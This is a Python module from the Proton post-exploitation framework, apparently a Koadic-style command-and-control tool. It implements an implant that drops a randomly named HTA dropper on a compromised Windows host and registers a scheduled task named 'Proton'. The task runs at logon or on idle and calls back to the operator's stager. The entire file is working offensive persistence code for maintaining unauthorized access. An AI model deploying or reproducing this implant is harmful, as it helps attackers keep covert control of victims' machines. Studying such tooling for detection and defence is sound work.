#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import core.loader
import uuid
import string
import random

class SchTasksJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error.", "")
            return False
        id = self.options.get("STAGER")
        payload = self.load_payload(id)
        self.options.set("CMD", payload)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))

        if self.options.get('DROPFILE'):
            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
        else:
            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')

        if "XP" in self.session.os or "2003" in self.session.os:
            self.options.set("NOFORCE", "true")

        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.options.set("ELEVATED", "false")

    def report(self, handler, data, sanitize = False):
        task = handler.get_header("Task", False)
        upload = handler.get_header('X-UploadFileJob', False)
        if upload == "true":
            dropper_script = core.loader.load_script(self.options.get("LDROPFILE"), self.options)
            template = core.loader.load_script("data/stager/js/mshta/template.hta")
            fdata = self.linter.post_process_script(dropper_script, template, self.options, self.session, False)

            headers = {}
            headers['Content-Type'] = 'application/octet-stream'
            headers['Content-Length'] = len(fdata)
            handler.reply(200, fdata, headers)
            return

        data = data.decode()

        if task == "QueryTask":
            handler.reply(200)
            if "ERROR" not in data:
                self.shell.print_warning("Proton task already exists. Overwriting old task with new one...")
            return

        if task == "NoForceTask":
            handler.reply(200)
            if "SUCCESS" not in data:
                self.shell.print_warning("Original Proton task could not be removed. This implant might fail :/")
            return

        if task == "AddTask":
            handler.reply(200)
            if "SUCCESS" in data:
                if self.session.elevated == 1:
                    self.shell.print_good("Proton task added. Persistence achieved with ONLOGON method.")
                else:
                    self.shell.print_good("Proton task added. Persistence achieved with ONIDLE method.")
                self.shell.print_command("schtasks /delete /tn Proton /f")
            else:
                self.shell.print_error("Could not add task!")
            return

        if task == "DeleteTask":
            handler.reply(200)
            if "SUCCESS" in data:
                self.shell.print_good("Task was deleted.")
            else:
                self.shell.print_error("Task could not be deleted!")
                self.shell.print_command("schtasks /delete /tn Proton /f")
            return

        if task == "AddDropper":
            handler.reply(200)
            if "true" in data.split("~~~")[0]:
                self.shell.print_good("HTA file dropped at "+data.split("~~~")[1].split()[0])
                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
            else:
                self.shell.print_error("HTA file could not be dropped!")
            return

        if task == "DeleteDropper":
            handler.reply(200)
            if "false" in data.split("~~~")[0]:
                self.shell.print_good("HTA file deleted from "+data.split("~~~")[1].split()[0])
            else:
                self.shell.print_error("HTA file could not be deleted!")
                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
            return

        if data == "Complete":
            super(SchTasksJob, self).report(handler, data)
            
        handler.reply(200)

    def done(self):
        self.results = "Completed!"
        self.display()

    def display(self):
        pass

class SchTasksImplant(core.implant.Implant):

    NAME = "Add Scheduled Task Payload"
    DESCRIPTION = "Establishes persistence via a scheduled task."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/persist/schtasks"

    def load(self):
        self.options.register("STAGER", "", "Stager to stage.")
        self.options.register("CMD", "", "Command.", hidden=True)
        self.options.register("CLEANUP", "false", "Will remove the scheduled task.", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output.", required=False)
        self.options.register("LDROPFILE", "data/implant/persist/schtasks.dropper", "Local file to drop on the target.", advanced=True)
        self.options.register("DROPDIR", "%ALLUSERSPROFILE%", "Directory to place the drop file.", advanced=True)
        self.options.register("FDROPDIR", "", "", hidden=True)
        self.options.register("RETRYATTEMPTS", "5", "Number of times to retry calling back.")
        self.options.register("RETRYDELAY", "60", "Seconds between retry attempts.")
        self.options.register("DROPFILE", "", "Name to give the drop file.", advanced=True)
        self.options.register("FDROPFILE", "", "", hidden=True)
        self.options.register("NOFORCE", "false", "", hidden=True)
        self.options.register("ELEVATED", "true", "", hidden=True)

    def job(self):
        return SchTasksJob

    def run(self):
        id = self.options.get("STAGER")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("No such stager!")
            return

        payloads = {}
        payloads["js"] = "data/implant/persist/schtasks.js"

        self.dispatch(payloads, self.job)
